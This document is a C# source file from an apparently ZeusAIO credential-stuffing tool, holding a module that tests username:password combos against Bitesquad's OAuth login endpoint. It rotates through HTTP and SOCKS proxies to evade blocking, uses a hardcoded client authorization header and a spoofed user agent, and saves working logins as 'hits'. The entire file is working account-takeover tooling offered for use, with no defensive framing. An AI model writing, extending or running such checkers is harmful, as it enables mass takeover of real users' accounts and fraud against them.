using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Bitesquad
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("User-Agent", "okhttp/3.8.1");
                            httpRequest.AddHeader("Authorization", "Basic Ml8zbnpiY2prN3p4dXNrdzA4OG9vMG9rd284NDQ0Y3c4MDhrbzhzb3NrMDhvc2c0OG9vZzpvOTllNTh6aHJkd3djMDBzY2t3NGs0OG9rczAwNDBzazA4Y3cwd3NvZ29jNHMwNGM0");
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                             new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string str = "username=" + s[0] + "&password=" + s[1] + "&grant_type=password&device_id=d9c8ad68-0453-4e56-94db-06fb95bfc5b8";
                            string strResponse = httpRequest.Post("https://www.bitesquad.com/oauth/v2/token", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("{\"message\":\"Invalid email/password combination\"}") || strResponse.Contains("Invalid email/password combination") || strResponse.Contains("Invalid email/password"))
                                {
                                    //
                                    break;
                                }
                                else if (strResponse.Contains("access_token")) //hit
                                {

                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - BITESQUAD] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Bitesquad_hits", s[0] + ":" + s[1]);
                                    return false;

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

     
    }
}
